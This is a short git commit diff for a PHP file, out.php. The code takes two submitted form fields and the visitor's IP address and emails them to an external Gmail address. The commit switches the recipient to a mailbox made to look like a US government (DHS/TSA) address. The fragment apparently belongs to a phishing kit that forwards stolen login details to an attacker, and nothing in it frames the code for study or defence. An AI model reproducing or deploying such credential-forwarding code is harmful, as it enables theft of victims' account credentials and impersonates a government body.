e45c87b0b051da26d3fc2d15d52bcd435282e06a
lulexhostt <68097035+lulexhostt@users.noreply.github.com>
2024-08-21 01:51:55 +0300

    initial commit

--- out.php
+++ out.php
@@ -21,7 +21,7 @@ if ($_POST["ai"] != "" && $_POST["namep"] != "") {
     $subject = "SimdiaDevv | $ip";
 
     // Specify the recipient email address
-    $to = "kingofking247247@gmail.com"; // Replace 'recipient@example.com' with the actual recipient email address
+    $to = "TSA.dhs.govv@gmail.com"; // Replace 'recipient@example.com' with the actual recipient email address
 
     // Send the email
     mail($to, $subject, $message);
